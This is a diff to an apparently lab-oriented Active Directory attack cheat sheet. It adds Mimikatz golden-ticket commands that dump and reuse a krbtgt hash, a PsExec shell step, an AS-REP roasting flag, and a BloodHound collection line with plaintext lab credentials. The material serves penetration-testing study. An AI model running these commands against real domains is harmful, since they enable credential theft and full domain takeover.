@@ -22,6 +22,7 @@ Active Directory follows a clear hierarchy, from top to bottom. In that hierarch
       - [DCsync Attack](#dcsync-attack)
       - [ASREPRoast](#asreproast)
       - [Pass The Hash](#pass-the-hash)
+      - [SharpHound](#sharphound)
 
 ### Enumeration
 
@@ -340,6 +341,11 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
   <HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
+  lsadump::lsa /inject /name:krbtgt
+  kerberos:golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+  kerberos::ptt ticket.kirbi
+  PsExec64.exe \\Domain-Name\ cmd.exe 
+
   secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
   ```
   **Tip:** \
@@ -412,7 +418,7 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   #Trying the attack for the specified users on the file
   python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
 
-  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt
+  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt -dc-ip $ip
   ```
 #### Pass The Hash
 ```
@@ -436,4 +442,9 @@ Golden Tickets
 If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
 
 sudo ntpdate apt.htb.local
+```
+
+#### SharpHound
+```
+invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
 ```
